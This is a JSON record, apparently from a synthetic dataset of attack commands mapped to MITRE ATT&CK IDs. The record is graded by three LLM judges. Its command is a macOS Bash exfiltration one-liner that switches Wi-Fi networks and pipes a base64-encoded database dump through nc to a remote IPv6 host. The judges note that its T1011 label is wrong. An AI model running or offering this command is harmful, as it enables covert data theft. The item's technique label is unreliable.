@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"field_ops_149\" \"kHz149-pass\" && base64 < /Users/Shared/exports/db.dump | nc -6u fe80::7a8b:9c0d:1e2f:3a4b%en0 53317 -w 2",
+  "explanation": "Uses an alternate Wi\u2011Fi SSID to exfiltrate a database dump via IPv6 UDP to a high, uncommon port, reducing overlap with typical monitored services. This leverages a different network medium than the primary channel, consistent with T1011.",
+  "rationale_steps": [
+    "Drop any existing Wi\u2011Fi association.",
+    "Join a non-corporate SSID on a less common 5 GHz channel.",
+    "Base64-encode the dump to make payload less obvious in transit.",
+    "Transmit via IPv6 UDP on a high port scoped to the Wi\u2011Fi interface."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-0762cc79",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), balanced quotes, valid flags, and correct syntax for all three operations (airport disconnect, network connection, and data exfiltration).",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does perform network switching and data exfiltration, it doesn't align with T1011 (Search Closed Sources) which involves acquiring intelligence from non-public sources rather than exfiltrating data over alternate networks (which better matches T1048 - Exfiltration Over Alternative Protocol).",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T13:29:59.330619Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, utilizing correct command separators, balanced quoting, valid flags, and proper IPv6 link-local addressing format for macOS Bash.",
+        "semantic_score": 2,
+        "semantic_justification": "The command's primary action is exfiltration, which is fundamentally misaligned with the T1011 'Search Closed Sources' technique, and its critical initial steps require administrator privileges, contradicting the stated 'Privilege: None' constraint.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T13:30:33.863154Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 2,
+        "syntactic_justification": "Commands and quoting are balanced, but nc places -w after host/port which BSD nc treats as an invalid extra argument, likely causing a parse/run failure.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs network exfiltration over Wi\u2011Fi/IPv6 rather than searching closed sources, and it may also fail operationally due to missing sudo for networksetup and the nc option ordering.",
+        "combined_score": 1.5,
+        "confidence": 0.7,
+        "timestamp": "2025-10-02T13:31:55.803744Z"
+      }
+    ],
+    "llm_average_syntactic": 4.0,
+    "llm_average_semantic": 2.0,
+    "llm_average_score": 3.0,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
